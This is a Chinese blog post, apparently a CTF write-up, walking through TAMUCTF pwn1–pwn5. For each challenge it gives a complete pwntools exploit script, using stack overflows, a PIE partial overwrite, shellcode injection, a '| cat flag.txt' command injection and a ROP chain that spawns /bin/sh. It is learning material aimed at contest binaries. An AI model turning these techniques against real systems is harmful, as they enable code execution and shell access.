@@ -1,0 +1,512 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TAMUCTF-pwn1到pwn5 - V1ct0r的博客</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="TriDiamond Obsidian,"> 
+    <meta name="description" content="师傅们说去做做TAMUCTF的题目，积累经验，于是去尝试了一波，才发现真的是有些地方自己不懂的知识盲区，也作为一个积累吧，在这里记录
+
+
+题目：pwn1首先看看题目先
+
+有栈溢出的漏洞，其他的保护全,"> 
+    <meta name="author" content="V1ct0r"> 
+    <link rel="alternative" href="atom.xml" title="V1ct0r的博客" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    <link href="https://fonts.loli.net/css?family=Roboto+Mono|Rubik&display=swap" rel="stylesheet">
+    
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">
+
+    
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">
+
+    
+<link rel="stylesheet" href="/css/obsidian.css">
+
+    
+<link rel="stylesheet" href="/css/ball-atom.min.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body class="loading">
+    <div class="loader">
+        <div class="la-ball-atom la-2x">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+    <span id="config-title" style="display:none">V1ct0r的博客</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div class="scrollbar gradient-bg-rev"></div>
+<div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <div class="navigation animated fadeIn fast delay-1s">
+        <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="http://yoursite.com">
+        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
+        <h3 class="subtitle">TAMUCTF-pwn1到pwn5</h3>
+        <div class="social">
+            <!--        <div class="like-icon">-->
+            <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+            <!--        </div>-->
+            <div>
+                <div class="share">
+                    
+                        <a href="javascript:;" class="iconfont icon-share1"></a>
+                        <div class="share-component-cc" data-disabled="facebook,douban,linkedin,diandian,tencent,google"></div>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    <div class="section">
+        <div class=article-header-wrapper>
+    <div class="article-header">
+        <div class="article-cover animated fadeIn" style="
+            animation-delay: 600ms;
+            animation-duration: 1.2s;
+            background-image: 
+                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
+                url(/img/cover.jpg) ">
+        </div>
+        <div class="else">
+            <p class="animated fadeInDown">
+                
+                <a href="/categories/PWN"><b>「
+                    </b>PWN<b> 」</b></a>
+                
+                January 03, 2020
+            </p>
+            <h3 class="post-title animated fadeInDown"><a href="/2020/01/03/TAMUCTF%E7%9A%84pwn1%E5%88%B0pwn5/" title="TAMUCTF-pwn1到pwn5" class="">TAMUCTF-pwn1到pwn5</a>
+            </h3>
+            
+            <p class="post-count animated fadeInDown">
+                
+                <span>
+                    <b class="iconfont icon-text2"></b> <i>Words count</i>
+                    24k
+                </span>
+                
+                
+                <span>
+                    <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
+                    22 mins.
+                </span>
+                
+                
+                
+                <span id="busuanzi_container_page_pv">
+                    <b class="iconfont icon-read"></b> <i>Read count</i>
+                    <span id="busuanzi_value_page_pv">0</span>
+                </span>
+                
+            </p>
+            
+            
+            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/stack/" rel="tag">stack</a></li></ul>
+            
+        </div>
+    </div>
+</div>
+
+<div class="screen-gradient-after">
+    <div class="screen-gradient-content">
+        <div class="screen-gradient-content-inside">
+            <div class="bold-underline-links screen-gradient-sponsor">
+                <p>
+                    <span class="animated fadeIn delay-1s"></span>
+                </p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="article">
+    <div class='main'>
+        <div class="content markdown animated fadeIn">
+            <p>师傅们说去做做TAMUCTF的题目，积累经验，于是去尝试了一波，才发现真的是有些地方自己不懂的知识盲区，也作为一个积累吧，在这里记录</p>
+<a id="more"></a>
+
+<h3 id="题目：pwn1"><a href="#题目：pwn1" class="headerlink" title="题目：pwn1"></a>题目：pwn1</h3><p>首先看看题目先</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-7fc949b1b7eea3c7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>有栈溢出的漏洞，其他的保护全开，拖进ida分析一波：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-c92691e3bef9ef0b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>逻辑很清晰了，前面的几个strcmp可以直接逆向思维，把正确的答案写到payload中，最后一步直接覆盖那个数v5为目标值即可：于是可以写出payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line">context(arch=<span class="string">'i386'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn1'</span>)</span><br><span class="line"><span class="comment">#标志位,0和１</span></span><br><span class="line"><span class="keyword">if</span> local: </span><br><span class="line">	p = process(<span class="string">'./pwn1'</span>)</span><br><span class="line">	libc = elf.libc</span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'pwn.tamuctf.com'</span>, <span class="number">4321</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span><span class="params">(a=<span class="string">''</span>)</span>:</span></span><br><span class="line">	gdb.attach(p,a)</span><br><span class="line">	<span class="keyword">if</span> a == <span class="string">''</span>:</span><br><span class="line">		raw_input()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += <span class="string">"Sir Lancelot of Camelot\n"</span></span><br><span class="line">p.recvuntil(<span class="string">"name?"</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += <span class="string">"To seek the Holy Grail.\n"</span></span><br><span class="line">p.recvuntil(<span class="string">"quest?"</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">flag = <span class="number">0x6FD</span></span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">payload += <span class="number">0x2B</span>*<span class="string">'a'</span></span><br><span class="line">payload += p32(<span class="number">0xDEA110C8</span>)</span><br><span class="line">p.recvuntil(<span class="string">"What... is my secret?"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>其中0x2B是v5相对于栈顶的偏移，这样就可以getshell了。</p>
+<hr>
+<h3 id="题目：pwn2"><a href="#题目：pwn2" class="headerlink" title="题目：pwn2"></a>题目：pwn2</h3><p>同理：先检查再ida静态分析一波：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-83d76c94cc7b026b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/9085575-fdd0679fd68aaf6a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/9085575-1f404b24a22bc436.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>可以知道的内容是开了内存地址随机化等保护，但是有栈溢出漏洞，在这里一开始不会内存地址随机化的题目，就先去学习了一波：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-d60f5447a88a8ccb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>这种保护机制就是在每次加载进程时，内存地址都不一样，达到保护的目的，但是一般来说低字节2位不变，那么我们就可以通过覆盖低字节来改变它的跳转方向，也就是上面所说的3，看到return的是v3，而且有栈溢出漏洞和strnpy函数，那么就可以对低两位字节覆盖，覆盖成什么呢？怎么覆盖，继续看ida分析：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-20c51ed71d02dbb2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-024ac8bd67853c99.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>从这里可以看出v3相对于栈顶的偏移是0x1e，然后print_flag函数的低地址是0x6D8，而v3的初始值是那个two函数，低地址是0x6AD，可知只有最后一个字节不同，那么只覆盖最后一个字节即可，这样，payload就可以写出来了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line">context(arch=<span class="string">'i386'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn2'</span>)</span><br><span class="line"><span class="comment">#标志位,0和１</span></span><br><span class="line"><span class="keyword">if</span> local: </span><br><span class="line">	p = process(<span class="string">'./pwn2'</span>)</span><br><span class="line">	libc = elf.libc</span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'pwn.tamuctf.com'</span>, <span class="number">4322</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line">flag_addr = <span class="number">0x6D8</span></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += <span class="number">0x1e</span>*<span class="string">'a'</span></span><br><span class="line">payload += <span class="string">"\xd8"</span></span><br><span class="line">p.recvuntil(<span class="string">"Which function would you like to call?\n"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="题目：pwn3"><a href="#题目：pwn3" class="headerlink" title="题目：pwn3"></a>题目：pwn3</h3><p>一波分析：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-aceb7efbf5447bfc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-7b3b6ada2e38798a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>可以知道堆栈可执行（窃喜一波），栈溢出漏洞，开了内存地址随机化和got表不可改，</p>
+<p>从ida可以知道它返回的地址是栈顶指针，直接用，直接生成shellcode填充，不够的用垃圾字符填充，然后栈溢出到return地址，直接填栈顶指针，上payload，栈大小是0x12A+0x4 = 0x12E（覆盖ebp）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#coding&#x3D;utf8</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">context.terminal &#x3D; [&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;bash&#39;,&#39;-c&#39;]</span><br><span class="line">local &#x3D; 0</span><br><span class="line">elf &#x3D; ELF(&#39;.&#x2F;pwn3&#39;)</span><br><span class="line">#标志位,0和１</span><br><span class="line">if local: </span><br><span class="line">	p &#x3D; process(&#39;.&#x2F;pwn3&#39;)</span><br><span class="line">	libc &#x3D; elf.libc</span><br><span class="line"></span><br><span class="line">else:</span><br><span class="line">	p &#x3D; remote(&#39;pwn.tamuctf.com&#39;, 4323)</span><br><span class="line">	</span><br><span class="line">def debug(addr,PIE&#x3D;True):</span><br><span class="line">	if PIE:</span><br><span class="line">		text_base &#x3D; int(os.popen(&quot;pmap &#123;&#125;| awk &#39;&#123;&#123;print $1&#125;&#125;&#39;&quot;.format(p.pid)).readlines()[1], 16)</span><br><span class="line">		gdb.attach(p,&#39;b *&#123;&#125;&#39;.format(hex(text_base+addr)))</span><br><span class="line">	else:</span><br><span class="line">		gdb.attach(p,&quot;b *&#123;&#125;&quot;.format(hex(addr)))</span><br><span class="line"></span><br><span class="line">addr &#x3D; int(p.recv()[-12:-2],16)</span><br><span class="line">print hex(addr)</span><br><span class="line">shellcode &#x3D; asm(shellcraft.sh())</span><br><span class="line">payload &#x3D; shellcode.ljust(0x12E,&#39;a&#39;)</span><br><span class="line">payload +&#x3D; p32(addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>那么就直接getshell了，中间的那个debug函数是专门对于内存地址随机化的下断点函数，可以多多积累。</p>
+<hr>
+<h3 id="题目：pwn4"><a href="#题目：pwn4" class="headerlink" title="题目：pwn4"></a>题目：pwn4</h3><p><img src="https://upload-images.jianshu.io/upload_images/9085575-cff5423af1cb097d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-d5b4315a6b951324.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/9085575-395b9f0caedc224e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>栈溢出漏洞，堆栈不可执行，分析ida可以知道laas函数是关键，我们输入的是system的参数，一开始直接/bin/sh发现是不行的，因为strchr比较中，47就是“/”，有个保护机制在里面，进入run_cmd看看，发现是有个ls命令，马上想到ls是浏览当前目录下所有文件，那我直接cat flag.txt文件不就OK了吗？（后来被师傅锤了，因为字符串就等于ls cat flag.txt，当然是不行的呀，要有管道符号过渡下，于是加个“|”就好啦），上payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#coding&#x3D;utf8</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">context.terminal &#x3D; [&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;bash&#39;,&#39;-c&#39;]</span><br><span class="line">context(arch&#x3D;&#39;amd64&#39;, os&#x3D;&#39;linux&#39;)</span><br><span class="line">local &#x3D; 0</span><br><span class="line">elf &#x3D; ELF(&#39;.&#x2F;pwn4&#39;)</span><br><span class="line">#标志位,0和１</span><br><span class="line">if local: </span><br><span class="line">	p &#x3D; process(&#39;.&#x2F;pwn4&#39;)</span><br><span class="line">	libc &#x3D; elf.libc</span><br><span class="line">    </span><br><span class="line">else:</span><br><span class="line">	p &#x3D; remote(&#39;pwn.tamuctf.com&#39;, 4324)</span><br><span class="line">	</span><br><span class="line">def z(a&#x3D;&#39;&#39;):</span><br><span class="line">	gdb.attach(p,a)</span><br><span class="line">	if a &#x3D;&#x3D; &#39;&#39;:</span><br><span class="line">		raw_input()</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;&#39;</span><br><span class="line">payload +&#x3D; &quot;| cat flag.txt&quot;</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;&#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这样就直接getshell了，也知道了ls+其他命令的配合（linux基础不够，继续学习~）</p>
+<hr>
+<h3 id="题目：pwn5"><a href="#题目：pwn5" class="headerlink" title="题目：pwn5"></a>题目：pwn5</h3><p><img src="https://upload-images.jianshu.io/upload_images/9085575-cff5423af1cb097d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/9085575-f170a0502675ab8d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-d5b4315a6b951324.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/9085575-395b9f0caedc224e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>可以知道是个静态文件，然后有栈溢出漏洞，开了堆栈不可执行保护，这题乍一看和pwn4一样，我以为思路差不多，但是仔细观察发现snprintf这个拷贝函数只能拷贝7个字节，哦豁，完蛋，这可咋整呢？想起来是个静态文件，于是想到有个rop链：</p>
+<p>ROPgadget –binary pwn5 –ropchain使用这个命令，看到有个ROP链，可以直接getshell的，那么直接覆盖到return地址，然后写上这个链即可：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">#coding&#x3D;utf8</span><br><span class="line">from pwn import *</span><br><span class="line">from struct import pack</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">context.terminal &#x3D; [&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;bash&#39;,&#39;-c&#39;]</span><br><span class="line">context(arch&#x3D;&#39;i386&#39;, os&#x3D;&#39;linux&#39;)</span><br><span class="line">local &#x3D; 0</span><br><span class="line">elf &#x3D; ELF(&#39;.&#x2F;pwn5&#39;)</span><br><span class="line">#标志位,0和１</span><br><span class="line">if local:</span><br><span class="line">	ph &#x3D; process(&#39;.&#x2F;pwn5&#39;)</span><br><span class="line">	libc &#x3D; elf.libc</span><br><span class="line">    </span><br><span class="line">else:</span><br><span class="line">	ph &#x3D; remote(&#39;pwn.tamuctf.com&#39;,4325)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#下断点专用函数	</span><br><span class="line">#def z(a&#x3D;&#39;&#39;):</span><br><span class="line">	#gdb.attach(p,a)</span><br><span class="line">	#if a &#x3D;&#x3D; &#39;&#39;:</span><br><span class="line">		#raw_input()</span><br><span class="line">#z(&#39;b*0x00000\nc&#39;)</span><br><span class="line">p &#x3D; &#39;a&#39;*0xD + &#39;a&#39;*0x4</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0806f68a) # pop edx ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080eb060) # @ .data</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080b8836) # pop eax ; ret</span><br><span class="line">p +&#x3D; &#39;&#x2F;bin&#39;</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0805501b) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0806f68a) # pop edx ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080eb064) # @ .data + 4</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080b8836) # pop eax ; ret</span><br><span class="line">p +&#x3D; &#39;&#x2F;&#x2F;sh&#39;</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0805501b) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0806f68a) # pop edx ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080eb068) # @ .data + 8</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x08049373) # xor eax, eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0805501b) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080481c9) # pop ebx ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080eb060) # @ .data</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080df3bd) # pop ecx ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080eb068) # @ .data + 8</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0806f68a) # pop edx ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x080eb068) # @ .data + 8</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x08049373) # xor eax, eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807aecf) # inc eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807aecf) # inc eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807aecf) # inc eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807aecf) # inc eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807aecf) # inc eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807aecf) # inc eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807aecf) # inc eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807aecf) # inc eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807aecf) # inc eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807aecf) # inc eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807aecf) # inc eax ; ret</span><br><span class="line">p +&#x3D; pack(&#39;&lt;I&#39;, 0x0806d2d7) # int 0x80</span><br><span class="line"></span><br><span class="line">ph.recvuntil(&quot;Enter the arguments you would like to pass to ls:&quot;)</span><br><span class="line">ph.sendline(p)</span><br><span class="line"></span><br><span class="line">ph.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这样就可以直接getshell了，这是静态文件栈溢出时用到的一个技巧，积累起来，虽然以后的静态文件可能不多，但是作为一个分支吧。</p>
+<hr>
+<p>最后的两题以我现在的能力还刚不动，等以后有机会再更新~</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls"
+                data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+            <ul id="audio-list" style="display:none">
+                
+                
+                <li title='0' data-url='/statics/chengdu.mp3'></li>
+                
+                    
+            </ul>
+            
+            
+            
+    <div id='gitalk-container' class="comment link"
+        data-ae='true'
+        data-ci='ec894e2b66f752e8b7fb'
+        data-cs='3ccc2e92bb350688fe2c2dc2930189b62622bfb1'
+        data-r='blog-comments'
+        data-o='TriDiamond'
+        data-a='TriDiamond'
+        data-d=''
+    >Comments</div>
+
+
+            
+            
+        </div>
+        <div class="sidebar">
+            <div class="box animated fadeInRight">
+                <div class="subbox">
+                    <img src="https://res.cloudinary.com/tridiamond/image/upload/v1573019751/TriDiamond_logo_ui_xeublz.jpg" height=300 width=300></img>
+                    <p>V1ct0r</p>
+                    <span>Where there is a will,there is a way！</span>
+                    <dl>
+                        <dd><a href="https://github.com/TriDiamond" target="_blank"><span
+                                    class=" iconfont icon-github"></span></a></dd>
+                        <dd><a href="https://twitter.com/TriDiamond6" target="_blank"><span
+                                    class=" iconfont icon-twitter"></span></a></dd>
+                        <dd><a href="https://stackoverflow.com/users/7602324/tridiamond?tab=profile" target="_blank"><span
+                                    class=" iconfont icon-stack-overflow"></span></a></dd>
+                    </dl>
+                </div>
+                <ul>
+                    <li><a href="/">62 <p>Articles</p></a></li>
+                    <li><a href="/categories">7 <p>Categories</p></a></li>
+                    <li><a href="/tags">59 <p>Tags</p></a></li>
+                </ul>
+            </div>
+            
+            
+            
+            <div class="box sticky animated fadeInRight faster">
+                <div id="toc" class="subbox">
+                    <h4>Contents</h4>
